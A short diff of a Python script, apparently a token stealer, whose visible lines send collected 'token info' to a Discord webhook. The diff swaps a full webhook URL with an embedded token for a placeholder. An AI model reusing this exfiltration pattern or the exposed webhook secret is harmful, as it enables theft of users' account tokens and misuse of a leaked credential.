@@ -266,7 +266,7 @@ def main(webhook_url: str):
         webhook.send_tokens(token_info_list)
 
 if __name__ == "__main__":
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1379789949959667712/2WDKEyBldr1lN9WoJsDB8Pmp4NVFUWmhXqEme1LaSiDW7N6LHzc3RLBfEi9azK12Qv3o"
+    WEBHOOK_URL = "https://discord.com/api/webhooks/ ? "
     try:
         main(WEBHOOK_URL)
     except Exception:
